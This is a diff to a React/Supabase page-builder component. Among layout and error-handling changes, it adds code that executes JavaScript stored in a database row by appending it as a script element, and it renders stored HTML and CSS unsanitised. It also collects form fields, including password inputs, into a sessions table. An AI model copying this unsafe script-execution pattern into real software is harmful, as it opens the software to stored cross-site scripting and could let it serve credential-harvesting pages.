@@ -51,12 +51,10 @@ const SessionPage = () => {
           .from('main_pages')
           .select('*')
           .eq('id', sessionId)
-          .single();
+          .maybeSingle();
 
-        if (mainPageError && mainPageError.code !== 'PGRST116') {
+        if (mainPageError) {
           console.error('Main page error:', mainPageError);
-          setError(`Database error: ${mainPageError.message}`);
-          return;
         }
 
         if (mainPageData) {
@@ -71,16 +69,14 @@ const SessionPage = () => {
 
           if (subPagesError) {
             console.error('Sub pages error:', subPagesError);
-            setError(`Sub pages error: ${subPagesError.message}`);
-            return;
-          }
-
-          console.log('Found sub pages:', subPagesData);
-          setSubPages(subPagesData || []);
-          
-          // Set the first sub page as current if available
-          if (subPagesData && subPagesData.length > 0) {
-            setCurrentSubPage(subPagesData[0]);
+          } else {
+            console.log('Found sub pages:', subPagesData);
+            setSubPages(subPagesData || []);
+            
+            // Set the first sub page as current if available
+            if (subPagesData && subPagesData.length > 0) {
+              setCurrentSubPage(subPagesData[0]);
+            }
           }
         } else {
           // If not found as main page, try as sub page
@@ -88,26 +84,39 @@ const SessionPage = () => {
             .from('sub_pages')
             .select('*')
             .eq('id', sessionId)
-            .single();
+            .maybeSingle();
 
           if (subPageError) {
             console.error('Sub page error:', subPageError);
-            setError('Page not found');
+            setError('Page not found in database');
             return;
           }
 
-          console.log('Found sub page:', subPageData);
-          setCurrentSubPage(subPageData);
+          if (subPageData) {
+            console.log('Found sub page:', subPageData);
+            setCurrentSubPage(subPageData);
 
-          // Also fetch the main page info
-          const { data: parentMainPage } = await supabase
-            .from('main_pages')
-            .select('*')
-            .eq('id', subPageData.main_page_id)
-            .single();
+            // Also fetch the main page info and other sub pages
+            const { data: parentMainPage } = await supabase
+              .from('main_pages')
+              .select('*')
+              .eq('id', subPageData.main_page_id)
+              .maybeSingle();
 
-          if (parentMainPage) {
-            setMainPage(parentMainPage);
+            if (parentMainPage) {
+              setMainPage(parentMainPage);
+              
+              // Fetch all sub pages for navigation
+              const { data: allSubPages } = await supabase
+                .from('sub_pages')
+                .select('*')
+                .eq('main_page_id', subPageData.main_page_id);
+              
+              setSubPages(allSubPages || []);
+            }
+          } else {
+            setError('Page not found');
+            return;
           }
         }
       } catch (error) {
@@ -120,6 +129,26 @@ const SessionPage = () => {
 
     fetchPageData();
   }, [sessionId]);
+
+  // Execute custom JavaScript when currentSubPage changes
+  useEffect(() => {
+    if (currentSubPage?.javascript) {
+      try {
+        console.log('Executing custom JavaScript:', currentSubPage.javascript);
+        // Create a script element and execute it
+        const script = document.createElement('script');
+        script.textContent = currentSubPage.javascript;
+        document.head.appendChild(script);
+        
+        // Clean up script when component unmounts or page changes
+        return () => {
+          document.head.removeChild(script);
+        };
+      } catch (error) {
+        console.error('Error executing custom JavaScript:', error);
+      }
+    }
+  }, [currentSubPage?.javascript]);
 
   const handleInputChange = (field: string, value: string) => {
     setFormData(prev => ({
@@ -139,7 +168,7 @@ const SessionPage = () => {
     try {
       console.log('Submitting form data:', formData);
 
-      // Get user's location and IP (simplified)
+      // Get user's IP and location (simplified)
       const location = 'Unknown Location';
       const ip = 'Unknown IP';
 
@@ -153,13 +182,16 @@ const SessionPage = () => {
           form_data: formData
         });
 
-      if (error) throw error;
+      if (error) {
+        console.error('Error inserting session data:', error);
+        throw error;
+      }
 
       toast.success('Data submitted successfully!');
       setFormData({}); // Reset form
     } catch (error) {
       console.error('Error submitting data:', error);
-      toast.error('Failed to submit data');
+      toast.error('Failed to submit data. Please try again.');
     }
   };
 
@@ -216,108 +248,113 @@ const SessionPage = () => {
   }
 
   return (
-    <div className="min-h-screen bg-background p-4">
-      <div className="max-w-2xl mx-auto">
-        {/* Main page info */}
-        {mainPage && (
-          <div className="mb-6">
-            <h1 className="text-3xl font-bold">{mainPage.name}</h1>
-            {mainPage.description && (
-              <p className="text-muted-foreground mt-2">{mainPage.description}</p>
-            )}
-          </div>
-        )}
+    <div className="min-h-screen bg-background">
+      {/* Render custom CSS */}
+      {currentSubPage?.css && (
+        <style dangerouslySetInnerHTML={{ __html: currentSubPage.css }} />
+      )}
 
-        {/* Sub page navigation */}
-        {subPages.length > 1 && (
-          <div className="mb-6">
-            <div className="flex flex-wrap gap-2">
-              {subPages.map((subPage) => (
-                <Button
-                  key={subPage.id}
-                  variant={currentSubPage?.id === subPage.id ? "default" : "outline"}
-                  size="sm"
-                  onClick={() => handleSubPageChange(subPage)}
-                >
-                  {subPage.name}
-                </Button>
-              ))}
-            </div>
-          </div>
-        )}
-
-        {/* Current sub page content */}
-        {currentSubPage && (
-          <Card>
-            <CardHeader>
-              <CardTitle>{currentSubPage.name}</CardTitle>
-              {currentSubPage.description && (
-                <p className="text-muted-foreground">{currentSubPage.description}</p>
+      <div className="p-4">
+        <div className="max-w-4xl mx-auto">
+          {/* Main page info */}
+          {mainPage && (
+            <div className="mb-6">
+              <h1 className="text-3xl font-bold">{mainPage.name}</h1>
+              {mainPage.description && (
+                <p className="text-muted-foreground mt-2">{mainPage.description}</p>
               )}
-            </CardHeader>
-            <CardContent>
+            </div>
+          )}
+
+          {/* Sub page navigation */}
+          {subPages.length > 1 && (
+            <div className="mb-6">
+              <div className="flex flex-wrap gap-2">
+                {subPages.map((subPage) => (
+                  <Button
+                    key={subPage.id}
+                    variant={currentSubPage?.id === subPage.id ? "default" : "outline"}
+                    size="sm"
+                    onClick={() => handleSubPageChange(subPage)}
+                  >
+                    {subPage.name}
+                  </Button>
+                ))}
+              </div>
+            </div>
+          )}
+
+          {/* Current sub page content */}
+          {currentSubPage && (
+            <div className="space-y-6">
+              {/* Sub page title and description */}
+              <div>
+                <h2 className="text-2xl font-semibold">{currentSubPage.name}</h2>
+                {currentSubPage.description && (
+                  <p className="text-muted-foreground mt-2">{currentSubPage.description}</p>
+                )}
+              </div>
+
               {/* Render custom HTML if available */}
               {currentSubPage.html && (
                 <div 
-                  className="mb-6 prose prose-sm max-w-none"
+                  className="prose prose-sm max-w-none"
                   dangerouslySetInnerHTML={{ __html: currentSubPage.html }}
                 />
               )}
 
               {/* Dynamic form based on fields */}
-              <form onSubmit={handleSubmit} className="space-y-4">
-                {currentSubPage.fields && currentSubPage.fields.length > 0 ? (
-                  currentSubPage.fields.map((field, index) => (
-                    <div key={index} className="space-y-2">
-                      <Label htmlFor={field}>{field}</Label>
-                      {field.toLowerCase().includes('message') || field.toLowerCase().includes('comment') ? (
+              <Card>
+                <CardHeader>
+                  <CardTitle>Submit Information</CardTitle>
+                </CardHeader>
+                <CardContent>
+                  <form onSubmit={handleSubmit} className="space-y-4">
+                    {currentSubPage.fields && currentSubPage.fields.length > 0 ? (
+                      currentSubPage.fields.map((field, index) => (
+                        <div key={index} className="space-y-2">
+                          <Label htmlFor={field}>{field}</Label>
+                          {field.toLowerCase().includes('message') || field.toLowerCase().includes('comment') || field.toLowerCase().includes('description') ? (
+                            <Textarea
+                              id={field}
+                              placeholder={`Enter ${field.toLowerCase()}`}
+                              value={formData[field] || ''}
+                              onChange={(e) => handleInputChange(field, e.target.value)}
+                            />
+                          ) : (
+                            <Input
+                              id={field}
+                              type={field.toLowerCase().includes('email') ? 'email' : 
+                                   field.toLowerCase().includes('phone') ? 'tel' : 
+                                   field.toLowerCase().includes('password') ? 'password' : 'text'}
+                              placeholder={`Enter ${field.toLowerCase()}`}
+                              value={formData[field] || ''}
+                              onChange={(e) => handleInputChange(field, e.target.value)}
+                            />
+                          )}
+                        </div>
+                      ))
+                    ) : (
+                      <div className="space-y-2">
+                        <Label htmlFor="message">Message</Label>
                         <Textarea
-                          id={field}
-                          placeholder={`Enter ${field.toLowerCase()}`}
-                          value={formData[field] || ''}
-                          onChange={(e) => handleInputChange(field, e.target.value)}
+                          id="message"
+                          placeholder="Enter your message"
+                          value={formData.message || ''}
+                          onChange={(e) => handleInputChange('message', e.target.value)}
                         />
-                      ) : (
-                        <Input
-                          id={field}
-                          type={field.toLowerCase().includes('email') ? 'email' : 
-                               field.toLowerCase().includes('phone') ? 'tel' : 'text'}
-                          placeholder={`Enter ${field.toLowerCase()}`}
-                          value={formData[field] || ''}
-                          onChange={(e) => handleInputChange(field, e.target.value)}
-                        />
-                      )}
-                    </div>
-                  ))
-                ) : (
-                  <div className="space-y-2">
-                    <Label htmlFor="message">Message</Label>
-                    <Textarea
-                      id="message"
-                      placeholder="Enter your message"
-                      value={formData.message || ''}
-                      onChange={(e) => handleInputChange('message', e.target.value)}
-                    />
-                  </div>
-                )}
+                      </div>
+                    )}
 
-                <Button type="submit" className="w-full">
-                  Submit
-                </Button>
-              </form>
-            </CardContent>
-          </Card>
-        )}
-
-        {/* Render custom CSS */}
-        {currentSubPage?.css && (
-          <style dangerouslySetInnerHTML={{ __html: currentSubPage.css }} />
-        )}
-
-        {/* Render custom JavaScript */}
-        {currentSubPage?.javascript && (
-          <script dangerouslySetInnerHTML={{ __html: currentSubPage.javascript }} />
-        )}
+                    <Button type="submit" className="w-full">
+                      Submit
+                    </Button>
+                  </form>
+                </CardContent>
+              </Card>
+            </div>
+          )}
+        </div>
       </div>
     </div>
   );
